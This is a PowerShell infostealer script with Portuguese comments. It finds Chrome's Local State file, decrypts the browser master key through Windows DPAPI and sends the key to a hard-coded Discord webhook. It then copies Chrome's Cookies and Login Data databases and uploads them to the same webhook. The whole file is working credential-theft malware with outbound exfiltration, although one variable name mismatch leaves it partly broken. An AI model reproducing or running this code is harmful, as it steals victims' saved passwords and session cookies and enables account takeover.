$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

try {
    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
    
    if (!$ls) { curl.exe -F "content=❌ Local State nao encontrado" $u; exit }

    # 1. Pega o conteúdo do JSON
    $j = Get-Content $ls.FullName -Raw | ConvertFrom-Json
    $encKey = $j.os_crypt.encrypted_key
    
# 2. Converte de Base64 e corta os 5 bytes do prefixo 'DPAPI'
$keyBytes = [Convert]::FromBase64String($encryptedKey)
$trimmedKey = $keyBytes[5..($keyBytes.Length - 1)]

# 3. A MÁGICA: Descriptografa usando a API do Windows
try {
    Add-Type -AssemblyName System.Security
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, 'CurrentUser')
    $finalKey = [Convert]::ToBase64String($decryptedKey)
    
    # Envia para o Discord - ESTA É A QUE VOCÊ COPIA
    curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA: $finalKey" $u
} catch {
    curl.exe -F "content=❌ Erro Fatal: O Windows bloqueou a chave. Erro: $($_.Exception.Message)" $u
}

    # 4. Envia os arquivos (Cookies e Senhas)
    $paths = @(
        (Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1),
        (Get-ChildItem -Path $base -Recurse -Filter "Login Data" | Select-Object -First 1)
    )

    foreach ($file in $paths) {
        if ($file) {
            $temp = "$env:TEMP\" + $file.Name + ".db"
            Copy-Item $file.FullName $temp -Force
            curl.exe -F "file=@$temp" $u
            Remove-Item $temp -Force
        }
    }
} catch {
    curl.exe -F "content=❌ Erro Geral no Script" $u
}
exit
